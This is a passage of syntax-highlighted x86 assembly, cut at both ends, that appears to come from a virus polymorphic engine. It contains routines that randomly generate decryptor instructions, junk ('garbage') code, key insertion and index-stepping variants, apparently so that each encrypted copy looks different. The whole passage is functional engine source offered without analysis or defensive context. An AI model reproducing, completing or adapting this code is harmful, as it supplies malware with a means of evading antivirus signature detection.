                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">CRYPT_SIMPLEX</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">crypt_xtended</span><span class="sc0">

                </span><span class="sc1">;Choose generator for [reg+imm] indexing mode</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tbl_dis_reg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">choose_magic</span><span class="sc0">

</span><span class="sc5">you_got_it</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;Use magic to convert some values into</span><span class="sc0">
                </span><span class="sc1">;desired instructions</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">size_correct</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">adn_reg_01</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">00000101b</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">adn_reg_02</span><span class="sc0">
</span><span class="sc5">adn_reg_01</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">common_part</span><span class="sc0">                
</span><span class="sc5">adn_reg_02</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">45h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">common_part</span><span class="sc0">

</span><span class="sc5">crypt_xtended</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;Choose [reg+reg] or [reg+reg+disp]</span><span class="sc0">

                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">CRYPT_COMPLEX</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ok_complex</span><span class="sc0">

                </span><span class="sc1">;Get random displacement from current displacement</span><span class="sc0">
                </span><span class="sc1">;eeehh?!?</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000010h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ptr_disp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">load_aux</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">

                </span><span class="sc1">;Choose generator for [reg+reg+imm] indexing mode</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tbl_paranoia</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">choose_magic</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">done_xtended</span><span class="sc0">

</span><span class="sc5">ok_complex</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ptr_disp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">load_aux</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">

                </span><span class="sc1">;Choose generator for [reg+reg] indexing mode</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tbl_xtended</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">choose_magic</span><span class="sc0">

</span><span class="sc5">done_xtended</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;Build decryptor instructions</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">size_correct</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">arn_reg_01</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">00000101b</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">arn_reg_01</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">arn_reg_02</span><span class="sc0">
</span><span class="sc5">arn_reg_01</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc5">arn_reg_02</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">arn_reg_03</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">00000101b</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">arn_reg_03</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc5">arn_reg_03</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;Restore aux reg state</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_READ_ONLY</span><span class="sc0">

</span><span class="sc5">common_part</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;Get post-build flags</span><span class="sc0">

                </span><span class="sc6">lodsb</span><span class="sc0">

                </span><span class="sc1">;Insert displacement from real address?</span><span class="sc0">

                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">skip_disp</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ptr_disp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">skip_disp</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;Insert key?</span><span class="sc0">

                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">skip_key</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">copy_key</span><span class="sc0">

</span><span class="sc5">skip_key</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;Generate reverse code</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_reverse</span><span class="sc0">

                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Choose a magic generator</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">choose_magic</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000006h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Do operand size correction</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">size_correct</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">oper_size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">store_correct</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">store_correct</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">store_correct</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Load aux reg with displacement</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">load_aux</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;Get a valid auxiliary register</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_READ_ONLY</span><span class="sc0">

                </span><span class="sc1">;Move displacement into aux reg</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate crypt-code</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">do_reverse</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">oper_size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">perform_crypt</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">loop_string</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDSTR</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_of_magic</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDKEY</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">last_spell</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">loop_string</span><span class="sc0">
</span><span class="sc5">last_spell</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">copy_key</span><span class="sc0">
</span><span class="sc5">end_of_magic</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Copy encryption key into work buffer taking care about operand size</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">copy_key</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypt_key</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">oper_size</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">loop_key</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">loop_key</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate decryptor action: Move index to next step</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">gen_next_step</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;Get number of bytes to inc or dec the index reg</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">oper_size</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">loop_update</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;Get number of bytes to update with this instruction</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;Check direction</span><span class="sc0">

                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">build_flags</span><span class="sc4">],</span><span class="sc5">CRYPT_DIRECTION</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">step_down</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_step_up</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">next_update</span><span class="sc0">

</span><span class="sc5">step_down</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_step_down</span><span class="sc0">

</span><span class="sc5">next_update</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">end_update</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">loop_update</span><span class="sc0">
</span><span class="sc5">end_update</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">do_step_up</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;Move index_reg up</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">up_with_inc</span><span class="sc0">

                </span><span class="sc1">;Now choose ADD or SUB</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">try_sub_1</span><span class="sc0">

</span><span class="sc5">try_add_1</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C081h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">try_sub_1</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0E881h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">up_with_inc</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;Generate INC reg_index</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000001h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">do_step_down</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;Move index_reg down</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">down_with_dec</span><span class="sc0">

                </span><span class="sc1">;Now choose ADD or SUB</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">try_sub_2</span><span class="sc0">

</span><span class="sc5">try_add_2</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C081h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
